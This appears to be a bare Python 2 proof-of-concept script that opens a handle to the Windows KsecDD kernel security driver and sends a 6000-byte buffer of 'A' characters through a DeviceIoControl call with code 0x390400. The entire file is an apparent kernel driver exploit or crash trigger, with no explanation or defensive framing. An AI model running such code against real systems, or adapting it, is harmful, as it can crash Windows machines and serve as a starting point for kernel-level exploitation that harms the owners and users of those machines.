import ctypes, sys
from ctypes import *
 
kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\GLOBALROOT\\Device\\KsecDD", 0xC0000000, 0, None, 0x3, 0, None)
 
if not hevDevice or hevDevice == -1:
    print "*** Couldn't get Device Driver handle."
    sys.exit(0)
print "Great!"
buf = 'A' * 6000
bufLength = len(buf)
 
kernel32.DeviceIoControl(hevDevice, 0x390400, buf, bufLength, None, 0, byref(c_ulong()), None)
